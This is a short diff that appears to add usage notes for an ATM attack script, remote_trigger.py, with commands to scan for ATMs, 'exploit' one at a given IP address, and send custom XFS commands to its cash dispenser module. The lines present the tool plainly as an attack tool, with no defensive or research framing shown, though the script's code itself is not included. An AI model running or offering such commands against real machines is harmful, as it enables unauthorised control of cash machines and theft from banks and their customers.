@@ -1,0 +1,8 @@
+# Discover ATMs
+python3 remote_trigger.py --scan
+
+# Exploit specific ATM
+python3 remote_trigger.py --exploit -t 192.168.1.100
+
+# Send custom XFS command
+python3 remote_trigger.py -t 192.168.1.100 -c "cdm status"
